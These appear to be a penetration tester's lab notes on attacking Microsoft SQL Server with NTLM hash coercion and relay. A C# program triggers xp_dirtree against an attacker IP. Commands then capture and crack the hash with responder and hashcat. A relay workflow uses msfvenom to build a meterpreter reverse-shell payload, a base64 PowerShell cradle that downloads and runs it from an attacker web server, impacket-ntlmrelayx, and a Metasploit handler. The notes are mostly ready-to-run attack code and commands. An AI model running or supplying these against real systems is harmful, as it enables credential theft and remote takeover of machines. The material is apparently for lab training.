
```
using System;

using System.Data.SqlClient;

  

namespace SQL

{

    class Program

    {

        static void Main(string[] args)

        {

            String sqlServer = "dc01.corp1.com";

            String database = "master";

  

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

  

            try

            {

                con.Open();

                Console.WriteLine("Auth success!");

            }

            catch

            {

                Console.WriteLine("Auth failed");

                Environment.Exit(0);

            }

  

            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";

            SqlCommand command = new SqlCommand(query, con);

            SqlDataReader reader = command.ExecuteReader();

            reader.Close();

  

            con.Close();

        }

    }

}
```

Just run a  'sudo responder -I tun0' to catch it, then hashcat -m 5600 [hash] /usr/share/wordlists/rockyou.txt

Compile it in Visual Studio Console App (C#) .Net Framework




NTLMx Relay
* This workflow achieves code execution on appsrv01 as SQL service account without hash cracking
* Can't be used against the target itself (relaying back to the same box), and DCs likely have SMB signing enabled so it potentially won't work there either

Steps:

```
Kali Box:
cd ~/Documents/web
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.186 LPORT=443 -f psh-reflection > run.txt
sudo python3 -m http.server 80

## Create Base64-Encoded Cradle
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\"http://192.168.49.57/run.txt\") | IEX'.encode('utf-16le')).decode())"
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.118.6 -c "powershell -enc <FULL_BASE64_STRING>"

msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.186
set LPORT 443
set ExitOnSession false
exploit -j

RDP to client01, update and run C# Executable to do the xp_dirtree. The Code snippet at the top of this note is what works. Update the IP to be your Kali box


# Metasploit
sessions -i <session_id>


```

#### Troubleshooting Notes

- Ensure web server runs on port 80 and run.txt is in root directory.
- Full, uncorrupted base64 string is critical (regenerate if truncated).
- Lab requires outbound HTTP/443 from appsrv01 to Kali (egress permitted).